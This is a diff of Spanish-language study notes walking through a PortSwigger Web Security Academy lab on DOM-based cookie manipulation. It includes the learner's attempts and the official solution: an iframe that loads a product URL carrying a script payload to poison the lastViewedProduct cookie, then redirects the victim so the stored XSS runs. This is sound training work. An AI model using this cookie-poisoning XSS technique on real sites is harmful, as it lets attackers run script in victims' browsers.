@@ -475,4 +475,75 @@ He cambiado y dentro del onload he sustituido el " por un '. Y las ' que había 
 
 ![](assets/2022-07-18-20-32-49.png)
 
-LABORATORIOS de manipulación de cookies	document.cookie
+# DOM-based cookie manipulation
+
+## Lab: DOM-based cookie manipulation
+
+This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.
+
+- call print()
+- using exploit server
+
+
+```html
+ document.cookie = 'cookieName='+location.hash.slice(1);
+```
+
+![](assets/2022-07-19-10-12-53.png)
+
+![](assets/2022-07-19-10-14-15.png)
+```js
+ script>
+     document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+ </script>
+```       
+En ver el botón "último producto visto" Guarda la cookie con la dirección 
+
+Mi primera opción realmente sería poner un ```&'><script>print()</script>```
+Con esto estaríamos haciendo el error dom que vimos antes.
+
+Ahora habría que enviarlo nuestra victima.
+
+
+
+Voy a intentar poner en un iframe y ejecutarlo en mi máquina.
+
+```html
+<iframe src="https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1&'><script>print()</script>">
+```
+He tenido que sustituir el 1' por 1" porque sino no funcionaba, pero ya lo veo en mi exploit cuando lo hago contra mi
+```html
+<iframe src="https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1&'><script>print()</script>">
+```
+![](assets/2022-07-19-10-51-57.png)
+
+Vale, con esta opción consguimos guardar en la cookie pero hasta que el usuario no ejecuta el enlace de lastviewarticle... no se lanza es el script por lo que tendríamos que forzarlo.
+
+Se me ocurre decir que si no estás en la pagina de producto que vayas. Vemos el objeto por ejemplo bounty dentro de windows. que su propiedad src sea mi web objetivo.
+
+
+![](assets/2022-07-19-11-20-48.png)
+
+```html
+ <iframe src="https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="location='https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1'">
+ ```
+
+ Realmente está funcionandome por lo menos a mi directamente... pienso que le debería de funcionar a la víctima... 
+
+Voy a ver la solución porque no quiero perder más tiempo.
+
+```html
+<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
+```
+
+🖍La fuente original de ⏩ iframe coincide con la URL de una de las páginas del producto, excepto que se agregó una carga útil de JavaScript al final. 
+
+Cuando iframe se carga por primera vez, el navegador abre temporalmente la URL maliciosa, que luego se guarda como el valor de la lastViewedProductcookie.
+
+El controlador de eventos ⏩ onload se asegura de que la víctima sea redirigida inmediatamente a la página de inicio, sin saber que esta manipulación alguna vez tuvo lugar. Si bien el navegador de la víctima tiene guardada la cookie envenenada, cargar la página de inicio hará que se ejecute la carga útil.
+
+```html
+<iframe src="https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a1e00b703b229c6c0904786003200ce.web-security-academy.net/product?productId=1';window.x=1;">
+```
+
+![](assets/2022-07-19-11-27-12.png)
